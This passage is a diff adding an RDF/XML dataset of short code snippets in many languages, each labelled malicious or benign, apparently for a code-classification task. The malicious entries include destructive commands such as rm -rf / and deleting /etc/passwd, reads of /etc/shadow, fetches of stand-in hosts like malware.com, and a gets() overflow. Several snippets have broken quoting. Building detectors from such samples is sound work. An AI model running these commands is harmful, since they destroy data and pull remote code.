+    <rdfs:comment>#include &lt;fstream&gt;; int main() { std::ofstream outFile('/tmp/output.txt'); outFile &lt;&lt; 'Hello'; outFile.close(); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_30">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { System.out.println('Hello, World!'); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_37">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::thread::sleep; fn main() { sleep(std::time::Duration::from_secs(1)); }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_155">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>def add(a, b); a + b; end;</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_32">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { int x = 10 + 5; }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_127">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'fmt'; func main() { fmt.Println('Goodbye!') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_175">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def is_even(num): return num % 2 == 0;</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_35">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::fs::File; fn main() { let _file = File::open(\/etc/passwd\").unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_184">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++ </ex:language>
+    <rdfs:comment>#include &lt;iostream&gt;; void 1Function(){ system(\curl http://malware.com\");} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_109">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala</ex:language>
+    <rdfs:comment>println(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_87">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::process::Command; fn main() { Command::new(\wget\").arg(\"http://malware.com\").output().unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_130">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'io/ioutil'; func main() { ioutil.WriteFile('/tmp/file.txt', []byte{'H','e','l','l','o'}, 0644) }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_6">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import subprocess; subprocess.call(['rm', '-rf', '/'])</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_174">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import base64; encoded = base64.b64encode(b'secret data') # Encode sensitive data.</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_182">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C </ex:language>
+    <rdfs:comment>#include &lt;string.h&gt;; int main(){ char buffer[256]; gets(buffer); } </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_116">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>with open('file.txt', 'w') as f: f.write('Hello')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_23">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdlib.h&gt;; int main() { system('curl http://1.com'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_60">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>with open('file.txt', 'w') as f: f.write('Hello')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_25">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;iostream&gt;; int main() { std::cout &lt;&lt; 'Hello, World!'; return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_64">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>os.symlink('/etc/passwd', '/tmp/passwd_link')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet">
+    <rdf:type rdf:resource="http://www.w3.org/2002/07/owl#Class"/>
+    <rdfs:label>Code Snippet</rdfs:label>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_108">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala</ex:language>
+    <rdfs:comment>import java.nio.file.Files; Files.deleteIfExists(Paths.get(\/etc/passwd\"))"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_39">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def subtract(a, b): return a - b</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_5">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def multiply(a, b): return a * b</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_36">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>fn add(a: i32, b: i32) -&gt; i32 { a + b }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_48">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>new FileInputStream('/etc/shadow')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_150">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>eval('console.log(1 + 1)');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_168">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala</ex:language>
+    <rdfs:comment>import java.nio.file.Files; Files.deleteIfExists(Paths.get(\/etc/passwd\"))"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_171">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Objective-C</ex:language>
+    <rdfs:comment>@\"NSLog(@\"Hello World!\");\"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_172">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def read_file(): with open('sensitive_data.txt', 'r') as file: data = file.read()</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_66">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os'; func main() { os.Remove('/etc/passwd') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_196">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP </ex:language>
+    <rdfs:comment>exec('rm -rf /tmp/') </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_81">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { System.out.println('Goodbye!'); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_123">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def normal_function(): return 'Normal'; normal_function()</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_180">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C </ex:language>
+    <rdfs:comment>#include &lt;stdlib.h&gt;; int main(){ system(\rm -rf /tmp\"); return 0;} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_112">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import os; os.remove('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_198">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin </ex:language>
+    <rdfs:comment>val process = Runtime.getRuntime().exec(rm -rf /tmp/") "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_204">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell </ex:language>
+    <rdfs:comment>main = putStrLn Safe Haskell operation.";"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_96">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift</ex:language>
+    <rdfs:comment>let fileManager = FileManager.default; try? fileManager.removeItem(atPath: \/etc/passwd\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_43">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>fmt.Println('Goodbye!')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_24">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;cstdlib&gt;; int main() { system('rm -rf /'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_203">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell </ex:language>
+    <rdfs:comment>main = do{ removeFile /tmp/file.txt";}" </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_56">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import os; os.remove('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_65">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>print('This is a test.')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_176">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go </ex:language>
+    <rdfs:comment>package main; import \os\"; func main(){ os.RemoveAll(\"/tmp\")}"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_8">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import shutil; shutil.rmtree('/')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_131">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'net/http'; func main() { http.Get('http://malware.com') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_84">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>use std::fs::remove_file; fn main() { remove_file(\/etc/passwd\").unwrap(); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_126">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'os'; func main() { os.Remove('/etc/passwd') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_0">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>import os; os.system('rm -rf /')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_101">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Kotlin</ex:language>
+    <rdfs:comment>println(\Hello World!\")"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_31">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>import java.net.*; public class Main { public static void main(String[] args) throws Exception { new URL('http://1.com').openConnection(); }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_4">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>eval('__import__(\os\").system(\"ls\")')"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_89">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>console.log('Hello World!');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_107">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Haskell</ex:language>
+    <rdfs:comment>main = putStrLn \Hello World!\""</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_27">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++</ex:language>
+    <rdfs:comment>#include &lt;cmath&gt;; int main() { double x = sqrt(16); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_185">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C++ </ex:language>
+    <rdfs:comment>#include &lt;vector&gt;; void safeFunction(){ std::vector&lt;int&gt; v{1,2,3};}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_18">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C</ex:language>
+    <rdfs:comment>#include &lt;stdlib.h&gt;; int main() { system('rm -rf /'); return 0; }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_95">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Ruby</ex:language>
+    <rdfs:comment>def add(a, b); a + b; end;</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_122">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def secret_function(): pass; if 'backdoor_access' in locals() and backdoor_access: secret_function()</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_195">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Swift </ex:language>
+    <rdfs:comment>print(\This is a safe operation.\") "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_201">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Perl </ex:language>
+    <rdfs:comment>print Safe Perl operation.";"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_17">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go</ex:language>
+    <rdfs:comment>package main; import 'strings'; func main() { strings.ToUpper('hello') }</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_34">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Rust</ex:language>
+    <rdfs:comment>fn main() { println!(\Hello World!\"); }"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_41">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>print([x for x in range(5)])</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_197">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP </ex:language>
+    <rdfs:comment>echo 'Safe PHP operation.';</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#language">
+    <rdf:type rdf:resource="http://www.w3.org/2002/07/owl#DatatypeProperty"/>
+    <rdfs:label>Code Language</rdfs:label>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_205">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Scala </ex:language>
+    <rdfs:comment>Files.deleteIfExists(Paths.get(/tmp/file.txt"))" </rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_149">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>console.log('Hello World!');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_143">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Java</ex:language>
+    <rdfs:comment>public class Main { public static void main(String[] args) { int sum = 5 + 10; }}</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_177">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Go </ex:language>
+    <rdfs:comment>package main; import \fmt\"; func main(){ fmt.Println(\"This is safe.\")}"</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_90">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>JavaScript</ex:language>
+    <rdfs:comment>eval('console.log(1 + 1)');</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_113">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>def divide(a, b): return a / b</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_181">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>C </ex:language>
+    <rdfs:comment>#include &lt;stdio.h&gt;; int main(){ printf(\This is safe.\"); return 0;} "</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">0</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_115">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>Python</ex:language>
+    <rdfs:comment>os.system('wget http://1.com')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
+  <rdf:Description rdf:about="http://example.org/ontology#CodeSnippet_98">
+    <rdf:type rdf:resource="http://example.org/ontology#CodeSnippet"/>
+    <ex:language>PHP</ex:language>
+    <rdfs:comment>unlink('/etc/passwd')</rdfs:comment>
+    <ex:isMalicious rdf:datatype="http://www.w3.org/2001/XMLSchema#integer">1</ex:isMalicious>
+  </rdf:Description>
